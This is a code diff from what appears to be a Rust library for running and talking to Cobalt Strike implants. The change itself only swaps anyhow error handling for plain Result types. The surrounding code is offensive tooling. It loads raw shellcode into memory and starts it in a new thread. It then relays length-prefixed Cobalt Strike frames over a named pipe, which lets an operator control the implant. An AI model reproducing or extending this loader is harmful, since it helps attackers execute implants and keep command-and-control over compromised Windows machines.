@@ -35,8 +35,6 @@ use windows::{
     },
 };
 
-use anyhow::anyhow;
-
 /// handle to a running cobalt strike implant.  use create implant from buf to create
 /// and instance of this struct
 pub struct Implant {
@@ -106,26 +104,26 @@ impl Write for Implant {
 /// size followed by a buffer of that size.
 pub trait CSFrameRead {
     /// Read the frame.
-    fn read_frame(&mut self) -> anyhow::Result<Vec<u8>>;
+    fn read_frame(&mut self) -> Result<Vec<u8>, ()>;
 }
 
 /// Write a single cobaltstrike frame to a writeable.  writes a 32le size and then the buffer
 /// provided.
 pub trait CSFrameWrite {
     /// Write the frame.
-    fn write_frame(&mut self, data: Vec<u8>) -> anyhow::Result<()>;
+    fn write_frame(&mut self, data: Vec<u8>) -> Result<(), ()>;
 }
 
 impl<T> CSFrameRead for T
 where
     T: Read,
 {
-    fn read_frame(&mut self) -> anyhow::Result<Vec<u8>> {
+    fn read_frame(&mut self) -> Result<Vec<u8>, ()> {
         let mut size_buf = [0; 4];
-        self.read_exact(&mut size_buf)?;
+        self.read_exact(&mut size_buf).or(Err(()))?;
         let size = u32::from_le_bytes(size_buf);
-        let mut data = vec![0; size.try_into()?];
-        self.read_exact(data.as_mut_slice())?;
+        let mut data = vec![0; size.try_into().or(Err(()))?];
+        self.read_exact(data.as_mut_slice()).or(Err(()))?;
         return Ok(data);
     }
 }
@@ -133,10 +131,10 @@ impl<T> CSFrameWrite for T
 where
     T: Write,
 {
-    fn write_frame(&mut self, data: Vec<u8>) -> anyhow::Result<()> {
-        let size: u32 = data.len().try_into()?;
-        self.write_all(&size.to_le_bytes())?;
-        self.write_all(&data)?;
+    fn write_frame(&mut self, data: Vec<u8>) -> Result<(), ()> {
+        let size: u32 = data.len().try_into().or(Err(()))?;
+        self.write_all(&size.to_le_bytes()).or(Err(()))?;
+        self.write_all(&data).or(Err(()))?;
         return Ok(());
     }
 }
@@ -149,7 +147,7 @@ where
 pub fn create_implant_from_buf(
     shell_code: Vec<u8>,
     pipename: &str,
-) -> anyhow::Result<Implant> {
+) -> Result<Implant,()> {
     let full_pipename = format!("\\\\.\\pipe\\{}", pipename);
     unsafe {
         let buf =
@@ -167,7 +165,7 @@ pub fn create_implant_from_buf(
             ptr::null(),
             THREAD_CREATE_RUN_IMMEDIATELY,
             &mut threadid as *mut u32,
-        )?;
+        ).or(Err(()))?;
 
         let mut count = 0;
         loop {
@@ -186,7 +184,7 @@ pub fn create_implant_from_buf(
             } else {
                 count += 1;
                 if count > 10 {
-                    return Err(anyhow!("Timed out"));
+                    return Err(());
                 }
                 sleep(Duration::from_secs(1));
             };
